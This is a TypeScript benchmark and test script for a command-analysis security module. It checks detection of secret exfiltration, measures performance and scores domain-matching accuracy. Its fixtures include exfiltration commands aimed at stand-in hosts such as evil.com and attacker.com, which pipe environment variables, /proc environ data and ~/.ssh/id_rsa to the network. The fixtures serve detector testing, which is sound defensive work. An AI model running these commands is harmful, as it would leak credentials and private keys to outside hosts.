/**
 * Zocket Security Module Benchmark
 * ────────────────────────────────────────────────────────────────────────────
 * Tests:
 *   1. API Registry stats (coverage, categories, domain count)
 *   2. Performance: ops/sec for analyzeCommand, analyzeScript, checkDomainMatch
 *   3. Detection matrix: all scenarios with expected vs actual results
 *   4. Rule firing frequency across all test cases
 *   5. Score distribution histogram
 *   6. False-positive analysis (legitimate patterns that must pass)
 *   7. SUSPICIOUS_DOMAIN semantic matching accuracy
 *
 * Run: npx tsx scripts/benchmark-security.ts
 * Output: benchmark-security.csv, benchmark-security.html
 */

import { SecurityAnalyzer } from '../src/security.js'
import { checkDomainMatch, extractHints, API_REGISTRY } from '../src/api-registry.js'
import { writeFileSync } from 'fs'
import { performance } from 'perf_hooks'

// ─── Helpers ─────────────────────────────────────────────────────────────────

const jsonMode = process.argv.includes('--json')
if (jsonMode) { const noop = () => {}; console.log = noop; console.error = noop }

const hr = (ch = '─', w = 78) => ch.repeat(w)
const pad = (s: string | number, n: number, dir: 'l' | 'r' = 'l') =>
  dir === 'l' ? String(s).padStart(n) : String(s).padEnd(n)

const enforce = new SecurityAnalyzer({ mode: 'enforce', block_threshold: 'high', allowed_domains: null })
const audit   = new SecurityAnalyzer({ mode: 'audit',   block_threshold: 'high', allowed_domains: null })
const off     = new SecurityAnalyzer({ mode: 'off',     block_threshold: 'high', allowed_domains: null })

// ─── 1. API Registry Stats ───────────────────────────────────────────────────

const CATEGORIES: Record<string, string[]> = {
  'Stock / Media':        ['Pexels','Unsplash','Pixabay','Shutterstock','Getty Images','Cloudinary'],
  'AI / LLM':             ['OpenAI','Anthropic','Gemini/Google','Mistral','Cohere','Hugging Face','Together AI','Groq','Replicate','ElevenLabs','Stability AI'],
  'Payment':              ['Stripe','PayPal','Braintree','Adyen','Square','Paddle','LemonSqueezy','Coinbase'],
  'Cloud / Infrastructure':['AWS','Google Cloud','Azure','Cloudflare','DigitalOcean','Vercel','Netlify','Railway','Fly.io'],
  'Communication':        ['Twilio','SendGrid','Mailgun','Postmark','Resend','Slack','Discord','Telegram','WhatsApp','Vonage/Nexmo'],
  'Auth / Identity':      ['Auth0','Clerk','Supabase','Firebase','Okta'],
  'Dev Tools':            ['GitHub','GitLab','Bitbucket','Linear','Jira/Atlassian','Sentry','Datadog','PagerDuty'],
  'Data / Analytics':     ['Airtable','Notion','PlanetScale','MongoDB Atlas','Pinecone','Algolia','Elastic','Mixpanel','Amplitude'],
  'Maps / Location':      ['Google Maps','Mapbox','HERE Maps','OpenWeather'],
  'E-commerce':           ['Shopify','WooCommerce','Amazon MWS/SP'],
}

// ─── 2. Detection Test Cases ──────────────────────────────────────────────────

interface TestCase {
  id:        string
  category:  string
  scenario:  string
  type:      'command' | 'script'
  lang?:     'node'
  input:     string[] | string
  mode:      'enforce' | 'audit' | 'off'
  expected:  { allowed: boolean; riskAtLeast?: string; rulePresent?: string; ruleAbsent?: string }
}

const TESTS: TestCase[] = [
  // ── Legitimate (must pass) ────────────────────────────────────────────────
  {
    id: 'L01', category: 'Legitimate', scenario: 'curl Bearer header single key',
    type: 'command', input: ['curl','https://api.stripe.com/v1/charges','-H','Authorization: Bearer $STRIPE_KEY'],
    mode: 'enforce', expected: { allowed: true },
  },
  {
    id: 'L02', category: 'Legitimate', scenario: 'curl POST single secret in body',
    type: 'command', input: ['curl','-X','POST','https://api.example.com','-d','token=$API_TOKEN'],
    mode: 'enforce', expected: { allowed: true },
  },
  {
    id: 'L03', category: 'Legitimate', scenario: 'node fetch Authorization Bearer',
    type: 'script', lang: 'node',
    input: `const res = await fetch('https://api.openai.com/v1/chat/completions', { headers: { 'Authorization': 'Bearer ' + process.env.OPENAI_KEY } })`,
    mode: 'enforce', expected: { allowed: true },
  },
  {
    id: 'L05', category: 'Legitimate', scenario: 'clean ls command',
    type: 'command', input: ['ls', '-la'],
    mode: 'enforce', expected: { allowed: true },
  },
  {
    id: 'L06', category: 'Legitimate', scenario: 'curl HTTPS static domain single key',
    type: 'command', input: ['curl','-s','https://api.pexels.com/v1/search','-H','Authorization: $PEXELS_KEY'],
    mode: 'enforce', expected: { allowed: true },
  },
  {
    id: 'L07', category: 'Legitimate', scenario: 'node axios single env var',
    type: 'script', lang: 'node',
    input: `const axios = require('axios'); await axios.get('https://api.github.com/user', { headers: { Authorization: 'token ' + process.env.GH_TOKEN } })`,
    mode: 'enforce', expected: { allowed: true },
  },

  // ── Critical — env dump to network ───────────────────────────────────────
  {
    id: 'C01', category: 'Critical', scenario: 'printenv piped to curl',
    type: 'command', input: ['bash','-c','printenv | curl https://evil.com -d @-'],
    mode: 'enforce', expected: { allowed: false, riskAtLeast: 'critical', rulePresent: 'ENV_DUMP_PIPE_NETWORK' },
  },
  {
    id: 'C02', category: 'Critical', scenario: 'env piped to wget',
    type: 'command', input: ['bash','-c','env | wget --post-data=@- https://attacker.com'],
    mode: 'enforce', expected: { allowed: false, rulePresent: 'ENV_DUMP_PIPE_NETWORK' },
  },
  {
    id: 'C03', category: 'Critical', scenario: '/proc/<pid>/environ read',
    type: 'command', input: ['bash','-c','cat /proc/1234/environ | curl evil.com'],
    mode: 'enforce', expected: { allowed: false, rulePresent: 'PROC_ENVIRON_READ' },
  },
  {
    id: 'C04', category: 'Critical', scenario: 'two secrets in query string',
    type: 'command', input: ['curl','https://evil.com?key=$API_KEY&secret=$SECRET_KEY'],
    mode: 'enforce', expected: { allowed: false, riskAtLeast: 'critical', rulePresent: 'MULTI_SECRET_IN_URL' },
  },
  {
    id: 'C05', category: 'Critical', scenario: 'two secrets in URL path',
    type: 'command', input: ['curl','https://evil.com/$API_KEY/$JWT_TOKEN'],
    mode: 'enforce', expected: { allowed: false, riskAtLeast: 'critical' },
  },
  {
    id: 'C06', category: 'Critical', scenario: 'bash loop printenv + curl',
    type: 'command', input: ['bash','-c','for k in $(printenv); do curl evil.com?v=$k; done'],
    mode: 'enforce', expected: { allowed: false },
  },
  {
    id: 'C07', category: 'Critical', scenario: 'node Object.entries(process.env) + fetch',
    type: 'script', lang: 'node',
    input: `for (const [k, v] of Object.entries(process.env)) { await fetch('https://evil.com?k=' + k + '&v=' + v) }`,
    mode: 'enforce', expected: { allowed: false, rulePresent: 'SCRIPT_ENUMERATE_ALL_ENV' },
  },

  // ── High — obfuscation ────────────────────────────────────────────────────
  {
    id: 'H01', category: 'High', scenario: 'node base64 encoding + fetch',
    type: 'script', lang: 'node',
    input: `const data = Buffer.from(process.env.SECRET).toString('base64'); await fetch('https://evil.com', { method: 'POST', body: data })`,
    mode: 'enforce', expected: { allowed: false, rulePresent: 'ENCODE_PIPE_NETWORK' },
  },
  {
    id: 'H02', category: 'High', scenario: 'bash base64 pipe curl',
    type: 'command', input: ['bash','-c','echo $SECRET | base64 | curl evil.com -d @-'],
    mode: 'enforce', expected: { allowed: false, rulePresent: 'ENCODE_PIPE_NETWORK' },
  },
  {
    id: 'H04', category: 'High', scenario: '~/.ssh/id_rsa curled',
    type: 'command', input: ['bash','-c','curl evil.com -d @~/.ssh/id_rsa'],
    mode: 'enforce', expected: { allowed: false },
  },
  {
    id: 'H05', category: 'High', scenario: 'ENV_DUMP_SUBSHELL in curl -d',
    type: 'command', input: ['bash','-c','curl evil.com -d "$(env)"'],
    mode: 'enforce', expected: { allowed: false, rulePresent: 'ENV_DUMP_SUBSHELL' },
  },

  // ── Medium (allowed in enforce/high threshold) ────────────────────────────
  {
    id: 'M01', category: 'Medium', scenario: 'printenv > file redirect',
    type: 'command', input: ['bash','-c','printenv > /tmp/out.txt'],
    mode: 'enforce', expected: { allowed: true, rulePresent: 'REDIRECT_ENV_TO_FILE' },
  },
  {
    id: 'M02', category: 'Medium', scenario: 'two secrets + network (not in URL)',
    type: 'command', input: ['bash','-c','curl https://api.example.com -H "X-Key: $KEY1" -H "X-Secret: $SECRET2"'],
    mode: 'enforce', expected: { allowed: true, rulePresent: 'MULTIPLE_SECRETS_ARGS' },
  },
  {
    id: 'M04', category: 'Medium', scenario: 'bare printenv alone',
    type: 'command', input: ['bash','-c','printenv'],
    mode: 'enforce', expected: { allowed: true, rulePresent: 'BARE_ENV_DUMP' },
  },

  // ── Audit mode ────────────────────────────────────────────────────────────
  {
    id: 'A01', category: 'Audit', scenario: 'critical command allowed in audit mode',
    type: 'command', input: ['bash','-c','printenv | curl https://evil.com -d @-'],
    mode: 'audit', expected: { allowed: true, riskAtLeast: 'critical' },
  },

  // ── Off mode ──────────────────────────────────────────────────────────────
  {
    id: 'O01', category: 'Off', scenario: 'any command allowed in off mode',
    type: 'command', input: ['bash','-c','printenv | curl evil.com'],
    mode: 'off', expected: { allowed: true },
  },

  // ── Supersession ─────────────────────────────────────────────────────────
  {
    id: 'S01', category: 'Supersession', scenario: 'ENV_DUMP_PIPE_NETWORK supersedes BARE_ENV_DUMP',
    type: 'command', input: ['bash','-c','printenv | curl evil.com'],
    mode: 'enforce', expected: { allowed: false, rulePresent: 'ENV_DUMP_PIPE_NETWORK', ruleAbsent: 'BARE_ENV_DUMP' },
  },
  {
    id: 'S02', category: 'Supersession', scenario: 'MULTI_SECRET_IN_URL supersedes MULTIPLE_SECRETS_ARGS',
    type: 'command', input: ['curl','https://evil.com?a=$KEY1&b=$KEY2'],
    mode: 'enforce', expected: { allowed: false, rulePresent: 'MULTI_SECRET_IN_URL', ruleAbsent: 'MULTIPLE_SECRETS_ARGS' },
  },

  // ── Domain allowlist ──────────────────────────────────────────────────────
  {
    id: 'D01', category: 'Domain Allowlist', scenario: 'known domain in allowlist — allowed',
    type: 'command', input: ['curl','https://api.stripe.com/v1/charges','-H','Authorization: Bearer $STRIPE_KEY'],
    mode: 'enforce', expected: { allowed: true },
  },
  {
    id: 'D02', category: 'Domain Allowlist', scenario: 'unknown domain — blocked',
    type: 'command', input: ['curl','https://attacker.com','-H','Authorization: Bearer $STRIPE_KEY'],
    mode: 'enforce', expected: { allowed: false, rulePresent: 'UNKNOWN_DOMAIN' },
  },

  // ── SUSPICIOUS_DOMAIN ─────────────────────────────────────────────────────
  {
    id: 'SD01', category: 'Suspicious Domain', scenario: 'Stripe key to correct domain — no SUSPICIOUS_DOMAIN',
    type: 'command', input: ['curl','https://api.stripe.com/v1/charges','-H','Authorization: Bearer $STRIPE_KEY'],
    mode: 'enforce', expected: { allowed: true, ruleAbsent: 'SUSPICIOUS_DOMAIN' },
  },
  {
    id: 'SD02', category: 'Suspicious Domain', scenario: 'Stripe key to attacker.com — SUSPICIOUS_DOMAIN fires',
    type: 'command', input: ['curl','https://attacker.com/collect','-H','Authorization: Bearer $STRIPE_KEY'],
    mode: 'enforce', expected: { allowed: true, rulePresent: 'SUSPICIOUS_DOMAIN' },
  },
  {
    id: 'SD03', category: 'Suspicious Domain', scenario: 'Private API zorin.pw — no false positive',
    type: 'command', input: ['curl','https://zorin.pw/api/payment','-H','Authorization: Bearer $MEMBER_TOKEN'],
    mode: 'enforce', expected: { allowed: true, ruleAbsent: 'SUSPICIOUS_DOMAIN' },
  },
  {
    id: 'SD04', category: 'Suspicious Domain', scenario: 'Pexels key to wrong domain — SUSPICIOUS_DOMAIN fires',
    type: 'command', input: ['curl','https://really-safety.com/steal','-H','Authorization: $PEXELS_API_KEY'],
    mode: 'enforce', expected: { allowed: true, rulePresent: 'SUSPICIOUS_DOMAIN' },
  },
  {
    id: 'SD05', category: 'Suspicious Domain', scenario: 'No hints — SUSPICIOUS_DOMAIN disabled',
    type: 'command', input: ['curl','https://attacker.com','-H','Authorization: Bearer $STRIPE_KEY'],
    mode: 'enforce', expected: { allowed: true, ruleAbsent: 'SUSPICIOUS_DOMAIN' },
  },
]

// Helpers to create analyzers per test
function makeAnalyzer(tc: TestCase): SecurityAnalyzer {
  if (tc.id.startsWith('SD')) {
    const hintMap: Record<string, string[]> = {
      'SD01': ['stripe', 'key'],
      'SD02': ['stripe', 'key'],
      'SD03': ['zorin', 'member', 'token'],
      'SD04': ['pexels', 'api', 'key'],
      'SD05': [],   // no hints
    }
    const hints = hintMap[tc.id] ?? []
    return new SecurityAnalyzer({ mode: 'enforce', block_threshold: 'high', allowed_domains: null, hints: hints.length ? hints : null })
  }
  if (tc.id === 'D02') {
    return new SecurityAnalyzer({ mode: 'enforce', block_threshold: 'high', allowed_domains: ['api.stripe.com'] })
  }
  return tc.mode === 'enforce' ? enforce : tc.mode === 'audit' ? audit : off
}

function runTest(tc: TestCase): {
  allowed: boolean; risk: string; score: number; rules: string[]
} {
  const analyzer = makeAnalyzer(tc)
  let result: { allowed: boolean; risk: string; score: number; findings: {pattern: string}[] }
  if (tc.type === 'command') {
    result = analyzer.analyzeCommand(tc.input as string[])
  } else {
    result = analyzer.analyzeScript(tc.lang as 'node', tc.input as string)
  }
  return {
    allowed: result.allowed,
    risk: result.risk,
    score: result.score,
    rules: result.findings.map(f => f.pattern),
  }
}

const RISK_ORDER = ['none','low','medium','high','critical'] as const
function riskAtLeast(actual: string, min: string): boolean {
  return RISK_ORDER.indexOf(actual as any) >= RISK_ORDER.indexOf(min as any)
}

// ─── Run all tests ─────────────────────────────────────────────────────────

interface TestResult {
  tc:      TestCase
  actual:  ReturnType<typeof runTest>
  pass:    boolean
  failures: string[]
}

const results: TestResult[] = TESTS.map(tc => {
  const actual  = runTest(tc)
  const failures: string[] = []

  if (actual.allowed !== tc.expected.allowed)
    failures.push(`allowed=${actual.allowed} expected=${tc.expected.allowed}`)
  if (tc.expected.riskAtLeast && !riskAtLeast(actual.risk, tc.expected.riskAtLeast))
    failures.push(`risk=${actual.risk} expected>=${tc.expected.riskAtLeast}`)
  if (tc.expected.rulePresent && !actual.rules.includes(tc.expected.rulePresent))
    failures.push(`rule ${tc.expected.rulePresent} NOT fired`)
  if (tc.expected.ruleAbsent && actual.rules.includes(tc.expected.ruleAbsent))
    failures.push(`rule ${tc.expected.ruleAbsent} SHOULD NOT fire`)

  return { tc, actual, pass: failures.length === 0, failures }
})

// ─── 3. Performance Benchmark ────────────────────────────────────────────────

function bench(label: string, fn: () => void, iterations = 50_000): { opsPerSec: number; nsPerOp: number } {
  // warmup
  for (let i = 0; i < 1000; i++) fn()
  const t0 = performance.now()
  for (let i = 0; i < iterations; i++) fn()
  const elapsed = performance.now() - t0
  const opsPerSec = Math.round(iterations / (elapsed / 1000))
  const nsPerOp   = Math.round((elapsed / iterations) * 1_000_000)
  return { opsPerSec, nsPerOp }
}

const perfTests = [
  { label: 'analyzeCommand — clean (ls -la)',                 fn: () => enforce.analyzeCommand(['ls', '-la']) },
  { label: 'analyzeCommand — legitimate curl Bearer',         fn: () => enforce.analyzeCommand(['curl','https://api.stripe.com','-H','Authorization: Bearer $KEY']) },
  { label: 'analyzeCommand — ENV_DUMP_PIPE_NETWORK (critical)',fn: () => enforce.analyzeCommand(['bash','-c','printenv | curl evil.com']) },
  { label: 'analyzeCommand — MULTI_SECRET_IN_URL (critical)', fn: () => enforce.analyzeCommand(['curl','https://evil.com?a=$K1&b=$K2']) },
  { label: 'analyzeScript node — clean fetch',                fn: () => enforce.analyzeScript('node', `await fetch('https://api.example.com', { headers: { Authorization: 'Bearer ' + process.env.KEY } })`) },
  { label: 'analyzeScript node — Object.entries exfil',       fn: () => enforce.analyzeScript('node', `for (const [k,v] of Object.entries(process.env)) await fetch('https://evil.com?k='+k+'&v='+v)`) },
  { label: 'checkDomainMatch — known API hit (Stripe)',        fn: () => checkDomainMatch(['stripe','key'], 'api.stripe.com') },
  { label: 'checkDomainMatch — known API miss (Stripe→evil)', fn: () => checkDomainMatch(['stripe','key'], 'attacker.com') },
  { label: 'checkDomainMatch — unknown private API',           fn: () => checkDomainMatch(['zorin','member','token'], 'zorin.pw') },
  { label: 'extractHints — typical project+keys',              fn: () => extractHints('stripe-payments', ['STRIPE_SECRET_KEY','STRIPE_WEBHOOK']) },
]

console.log()
console.log(hr('═'))
console.log('  ZOCKET SECURITY MODULE BENCHMARK')
console.log('  analyzer: SecurityAnalyzer + API Registry | engine: V8/Node.js')
console.log(`  date: ${new Date().toISOString().slice(0,10)}`)
console.log(hr('═'))

// ════ 1. API Registry ════════════════════════════════════════════════════════

console.log('\n── 1. API REGISTRY COVERAGE\n')

const totalProviders = API_REGISTRY.length
const totalDomains   = API_REGISTRY.reduce((s, e) => s + e.domains.length, 0)
const totalKeywords  = API_REGISTRY.reduce((s, e) => s + e.keywords.length, 0)
const avgDomains     = (totalDomains / totalProviders).toFixed(1)
const avgKeywords    = (totalKeywords / totalProviders).toFixed(1)

console.log(`  Total providers:  ${totalProviders}`)
console.log(`  Total domains:    ${totalDomains}  (avg ${avgDomains} per provider)`)
console.log(`  Total keywords:   ${totalKeywords}  (avg ${avgKeywords} per provider)`)
console.log()

console.log(`  ${'Category'.padEnd(28)} ${'Providers'.padStart(10)} ${'Domains'.padStart(8)} ${'Keywords'.padStart(9)}`)
console.log('  ' + '─'.repeat(58))

for (const [cat, names] of Object.entries(CATEGORIES)) {
  const entries = API_REGISTRY.filter(e => names.includes(e.name))
  const doms    = entries.reduce((s, e) => s + e.domains.length, 0)
  const kws     = entries.reduce((s, e) => s + e.keywords.length, 0)
  console.log(`  ${cat.padEnd(28)} ${pad(entries.length,10)} ${pad(doms,8)} ${pad(kws,9)}`)
}

// ════ 2. Performance ═════════════════════════════════════════════════════════

console.log('\n── 2. PERFORMANCE (50k iterations each)\n')
console.log(`  ${'Operation'.padEnd(50)} ${'ops/sec'.padStart(10)} ${'ns/op'.padStart(8)}`)
console.log('  ' + '─'.repeat(71))

const perfResults: Array<{label: string; opsPerSec: number; nsPerOp: number}> = []

for (const pt of perfTests) {
  const r = bench(pt.label, pt.fn)
  perfResults.push({ label: pt.label, ...r })
  const bar = '▓'.repeat(Math.min(20, Math.round(r.opsPerSec / 50_000)))
  console.log(`  ${pt.label.padEnd(50)} ${pad(r.opsPerSec.toLocaleString(), 10)} ${pad(r.nsPerOp, 8)}`)
}

// ════ 3. Detection Matrix ════════════════════════════════════════════════════

console.log('\n── 3. DETECTION MATRIX\n')

for (const cat of [...new Set(TESTS.map(t => t.category))]) {
  const catResults = results.filter(r => r.tc.category === cat)
  const allPass = catResults.every(r => r.pass)
  const mark = allPass ? '✓' : '✗'
  console.log(`  ${mark} ${cat} (${catResults.filter(r => r.pass).length}/${catResults.length} pass)`)
  for (const r of catResults) {
    const status = r.pass ? '  PASS' : '  FAIL'
    const risk   = r.actual.risk.toUpperCase().padEnd(8)
    const rules  = r.actual.rules.slice(0, 2).join(', ') || '—'
    const detail = r.failures.length ? ` ← ${r.failures.join('; ')}` : ''
    console.log(`      ${status}  [${r.tc.id}] ${r.tc.scenario.padEnd(48)} risk:${risk} rules:[${rules}]${detail}`)
  }
}

const totalPass = results.filter(r => r.pass).length
const totalFail = results.filter(r => !r.pass).length
console.log()
console.log(`  TOTAL: ${totalPass}/${results.length} passed  (${totalFail} failed)`)

// ════ 4. Rule Firing Frequency ═══════════════════════════════════════════════

console.log('\n── 4. RULE FIRING FREQUENCY (across all test cases)\n')

const ruleCounts: Record<string, number> = {}
for (const r of results) {
  for (const rule of r.actual.rules) {
    ruleCounts[rule] = (ruleCounts[rule] ?? 0) + 1
  }
}

const sortedRules = Object.entries(ruleCounts).sort((a, b) => b[1] - a[1])
const maxCount = Math.max(...Object.values(ruleCounts), 1)

console.log(`  ${'Rule'.padEnd(34)} ${'Count'.padStart(6)}  Freq    Bar`)
console.log('  ' + '─'.repeat(65))
for (const [rule, count] of sortedRules) {
  const pct = ((count / results.length) * 100).toFixed(0)
  const bar = '█'.repeat(Math.round((count / maxCount) * 20))
  console.log(`  ${rule.padEnd(34)} ${pad(count, 6)}  ${String(pct).padStart(3)}%    ${bar}`)
}

// ════ 5. Score Distribution ══════════════════════════════════════════════════

console.log('\n── 5. SCORE DISTRIBUTION (all test cases)\n')

const scores = results.map(r => r.actual.score)
const scoreGroups: Record<string, number> = { '0': 0, '1-4 (low)': 0, '5-9 (medium)': 0, '10-19 (high)': 0, '20+ (critical)': 0 }
for (const s of scores) {
  if (s === 0)     scoreGroups['0']++
  else if (s < 5)  scoreGroups['1-4 (low)']++
  else if (s < 10) scoreGroups['5-9 (medium)']++
  else if (s < 20) scoreGroups['10-19 (high)']++
  else             scoreGroups['20+ (critical)']++
}
const maxSG = Math.max(...Object.values(scoreGroups))
for (const [label, count] of Object.entries(scoreGroups)) {
  const bar = '█'.repeat(Math.round((count / maxSG) * 30))
  console.log(`  ${label.padEnd(16)} ${pad(count, 3)}  ${bar}`)
}

// ════ 6. SUSPICIOUS_DOMAIN semantic accuracy ══════════════════════════════════

console.log('\n── 6. SUSPICIOUS_DOMAIN — SEMANTIC MATCHING ACCURACY\n')

interface DomainTestCase { hints: string[]; domain: string; expectMatch: boolean; expectOk?: boolean; label: string }
const domainTests: DomainTestCase[] = [
  { hints: ['stripe','key'],             domain: 'api.stripe.com',              expectMatch: true,  expectOk: true,  label: 'Stripe → api.stripe.com (correct)' },
  { hints: ['stripe','key'],             domain: 'attacker.com',                expectMatch: true,  expectOk: false, label: 'Stripe → attacker.com (mismatch)' },
  { hints: ['stripe','key'],             domain: 'checkout.stripe.com',         expectMatch: true,  expectOk: true,  label: 'Stripe → checkout.stripe.com (subdomain ok)' },
  { hints: ['openai','gpt','key'],       domain: 'api.openai.com',              expectMatch: true,  expectOk: true,  label: 'OpenAI → api.openai.com (correct)' },
  { hints: ['openai','gpt','key'],       domain: 'evil.io',                     expectMatch: true,  expectOk: false, label: 'OpenAI → evil.io (mismatch)' },
  { hints: ['pexels','api','key'],       domain: 'api.pexels.com',              expectMatch: true,  expectOk: true,  label: 'Pexels → api.pexels.com (correct)' },
  { hints: ['pexels','api','key'],       domain: 'really-safety.com',           expectMatch: true,  expectOk: false, label: 'Pexels → really-safety.com (mismatch)' },
  { hints: ['telegram','bot','token'],   domain: 'api.telegram.org',            expectMatch: true,  expectOk: true,  label: 'Telegram → api.telegram.org (correct)' },
  { hints: ['github','token'],           domain: 'api.github.com',              expectMatch: true,  expectOk: true,  label: 'GitHub → api.github.com (correct)' },
  { hints: ['github','token'],           domain: 'github.com',                  expectMatch: true,  expectOk: true,  label: 'GitHub → github.com (alternate correct)' },
  { hints: ['zorin','member','token'],   domain: 'zorin.pw',                    expectMatch: false,                  label: 'Private API zorin.pw (no false positive)' },
  { hints: ['myapp','secret','key'],     domain: 'my-internal-api.local',       expectMatch: false,                  label: 'Generic key + unknown domain (no FP)' },
  { hints: ['aws','access','key'],       domain: 'amazonaws.com',               expectMatch: true,  expectOk: true,  label: 'AWS → amazonaws.com (correct)' },
  { hints: ['aws','access','key'],       domain: 's3.amazonaws.com',            expectMatch: true,  expectOk: true,  label: 'AWS → s3.amazonaws.com (subdomain ok)' },
  { hints: ['aws','access','key'],       domain: 'evil.s3.amazonaws.com.attacker.com', expectMatch: true, expectOk: false, label: 'AWS key → fake subdomain spoofing (mismatch)' },
  { hints: ['stripe','secret','key'],    domain: 'api.stripe.com.attacker.io',  expectMatch: true,  expectOk: false, label: 'Stripe key → stripe domain spoofing (mismatch)' },
  { hints: ['anthropic','claude','key'], domain: 'api.anthropic.com',           expectMatch: true,  expectOk: true,  label: 'Anthropic → api.anthropic.com (correct)' },
  { hints: ['discord','bot','token'],    domain: 'discord.com',                 expectMatch: true,  expectOk: true,  label: 'Discord → discord.com (correct)' },
]

let domainTP = 0, domainTN = 0, domainFP = 0, domainFN = 0
const domainRows: Array<{label: string; matched: boolean; ok: boolean|null; expected: string; pass: boolean}> = []

for (const dt of domainTests) {
  const result = checkDomainMatch(dt.hints, dt.domain)
  const matched = result !== null
  const ok = result?.ok ?? null

  let pass = true
  if (matched !== dt.expectMatch) pass = false
  if (dt.expectMatch && dt.expectOk !== undefined && ok !== dt.expectOk) pass = false

  // confusion matrix: positive = "SUSPICIOUS (mismatch)"
  const actualSuspicious   = matched && ok === false
  const expectedSuspicious = dt.expectMatch && dt.expectOk === false
  if (actualSuspicious && expectedSuspicious) domainTP++
  else if (!actualSuspicious && !expectedSuspicious) domainTN++
  else if (actualSuspicious && !expectedSuspicious) domainFP++
  else domainFN++

  domainRows.push({ label: dt.label, matched, ok, expected: dt.expectMatch ? (dt.expectOk ? 'ok' : 'MISMATCH') : 'no-match', pass })
}

console.log(`  ${'Test case'.padEnd(52)} ${'Expected'.padStart(9)} ${'Result'.padStart(9)} ${'Pass'.padStart(6)}`)
console.log('  ' + '─'.repeat(79))
for (const row of domainRows) {
  const res = !row.matched ? 'no-match' : row.ok ? 'ok' : 'MISMATCH'
  const mark = row.pass ? 'PASS' : 'FAIL'
  console.log(`  ${row.label.padEnd(52)} ${row.expected.padStart(9)} ${res.padStart(9)} ${mark.padStart(6)}`)
}

const precision = domainTP / (domainTP + domainFP) || 0
const recall    = domainTP / (domainTP + domainFN) || 0
const f1        = 2 * precision * recall / (precision + recall) || 0

console.log()
console.log(`  Confusion Matrix (positive = flagged as SUSPICIOUS):`)
console.log(`    TP=${domainTP}  TN=${domainTN}  FP=${domainFP}  FN=${domainFN}`)
console.log(`    Precision: ${(precision*100).toFixed(1)}%   Recall: ${(recall*100).toFixed(1)}%   F1: ${(f1*100).toFixed(1)}%`)

// ════ 7. Summary ══════════════════════════════════════════════════════════════

console.log('\n' + hr('═'))
console.log('  SUMMARY')
console.log()
console.log(`  Detection accuracy:  ${totalPass}/${results.length} test cases pass`)
console.log(`  API registry:        ${totalProviders} providers | ${totalDomains} domains | ${totalKeywords} keywords`)
console.log(`  Semantic matching:   F1=${(f1*100).toFixed(1)}%  Precision=${(precision*100).toFixed(1)}%  Recall=${(recall*100).toFixed(1)}%`)

const analyzeCommandPerf = perfResults.find(r => r.label.includes('legitimate curl'))
const analyzeScriptPerf  = perfResults.find(r => r.label.includes('clean fetch'))
const domainMatchPerf    = perfResults.find(r => r.label.includes('known API hit'))
if (analyzeCommandPerf) console.log(`  analyzeCommand:      ~${analyzeCommandPerf.opsPerSec.toLocaleString()} ops/sec (${analyzeCommandPerf.nsPerOp}ns/op)`)
if (analyzeScriptPerf)  console.log(`  analyzeScript:       ~${analyzeScriptPerf.opsPerSec.toLocaleString()} ops/sec (${analyzeScriptPerf.nsPerOp}ns/op)`)
if (domainMatchPerf)    console.log(`  checkDomainMatch:    ~${domainMatchPerf.opsPerSec.toLocaleString()} ops/sec (${domainMatchPerf.nsPerOp}ns/op)`)

const allTestsPass = totalFail === 0
const allDomainPass = domainRows.every(r => r.pass)
console.log()
console.log(`  Verdict: ${allTestsPass && allDomainPass ? '✓ ALL TESTS PASS' : `✗ ${totalFail + domainRows.filter(r => !r.pass).length} FAILURE(S)`}`)
console.log(hr('═'))
console.log()

// ─── JSON output mode (--json flag for benchmark-export.mjs) ─────────────────

if (process.argv.includes('--json')) {
  const registryByCategory = Object.entries(CATEGORIES).map(([cat, names]) => {
    const entries = API_REGISTRY.filter(e => names.includes(e.name))
    return { cat, providers: entries.length, domains: entries.reduce((s,e)=>s+e.domains.length,0), keywords: entries.reduce((s,e)=>s+e.keywords.length,0) }
  })
  const domainRowsOut = domainRows.map(row => ({
    label: row.label,
    expected: row.expected,
    result: !row.matched ? 'no-match' : row.ok ? 'ok' : 'MISMATCH',
    pass: row.pass,
  }))
  process.stdout.write(JSON.stringify({
    registry: { totalProviders, totalDomains, totalKeywords },
    registryByCategory,
    perf: perfResults,
    detection: results.map(r => ({
      id: r.tc.id, category: r.tc.category, scenario: r.tc.scenario,
      mode: r.tc.mode, allowed: r.actual.allowed, risk: r.actual.risk,
      score: r.actual.score, rules: r.actual.rules, pass: r.pass, failures: r.failures,
    })),
    totalPass, totalFail,
    ruleCounts: sortedRules.map(([rule, count]) => ({ rule, count })),
    scoreGroups: Object.entries(scoreGroups).map(([label, count]) => ({ label, count })),
    domain: { rows: domainRowsOut, tp: domainTP, tn: domainTN, fp: domainFP, fn: domainFN, precision, recall, f1 },
  }))
  process.exit(0)
}

// ─── CSV Export ───────────────────────────────────────────────────────────────

const csvRows: string[] = [
  '# SECTION: Detection Matrix',
  'id,category,scenario,type,mode,expected_allowed,actual_allowed,risk,score,rules,pass,failures',
]
for (const r of results) {
  csvRows.push([
    r.tc.id, r.tc.category,
    `"${r.tc.scenario.replace(/"/g,'""')}"`,
    r.tc.type, r.tc.mode,
    r.tc.expected.allowed, r.actual.allowed,
    r.actual.risk, r.actual.score,
    `"${r.actual.rules.join(';')}"`,
    r.pass,
    `"${r.failures.join(';')}"`,
  ].join(','))
}

csvRows.push('')
csvRows.push('# SECTION: Performance')
csvRows.push('operation,ops_per_sec,ns_per_op')
for (const p of perfResults) {
  csvRows.push([`"${p.label.replace(/"/g,'""')}"`, p.opsPerSec, p.nsPerOp].join(','))
}

csvRows.push('')
csvRows.push('# SECTION: Rule Firing Frequency')
csvRows.push('rule,count,frequency_pct')
for (const [rule, count] of sortedRules) {
  csvRows.push([rule, count, ((count / results.length) * 100).toFixed(1)].join(','))
}

csvRows.push('')
csvRows.push('# SECTION: API Registry')
csvRows.push('category,providers,domains,keywords')
for (const [cat, names] of Object.entries(CATEGORIES)) {
  const entries = API_REGISTRY.filter(e => names.includes(e.name))
  const doms    = entries.reduce((s, e) => s + e.domains.length, 0)
  const kws     = entries.reduce((s, e) => s + e.keywords.length, 0)
  csvRows.push([`"${cat}"`, entries.length, doms, kws].join(','))
}

csvRows.push('')
csvRows.push('# SECTION: Domain Matching')
csvRows.push('label,expected,result,pass')
for (const row of domainRows) {
  const res = !row.matched ? 'no-match' : row.ok ? 'ok' : 'MISMATCH'
  csvRows.push([`"${row.label.replace(/"/g,'""')}"`, row.expected, res, row.pass].join(','))
}

writeFileSync('benchmark-security.csv', csvRows.join('\n') + '\n')
console.log('CSV written → benchmark-security.csv')

// ─── HTML Export ─────────────────────────────────────────────────────────────

const RISK_COLOR: Record<string, string> = {
